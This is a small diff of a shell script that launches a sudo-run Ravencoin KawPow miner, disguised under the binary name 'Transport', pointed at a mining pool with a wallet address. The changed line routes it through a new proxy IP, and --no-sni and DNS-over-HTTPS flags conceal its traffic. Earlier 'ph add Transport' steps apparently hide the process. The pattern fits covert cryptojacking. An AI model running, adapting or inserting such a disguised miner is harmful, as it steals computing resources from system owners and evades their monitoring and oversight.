@@ -16,4 +16,4 @@ ph add Transport
 sleep 9
 ph add Transport
 sleep 30
-sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 51.75.77.193:1081 --dns-https-server 1.1.1.1     
+sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 140.238.247.53:1080 --dns-https-server 1.1.1.1     
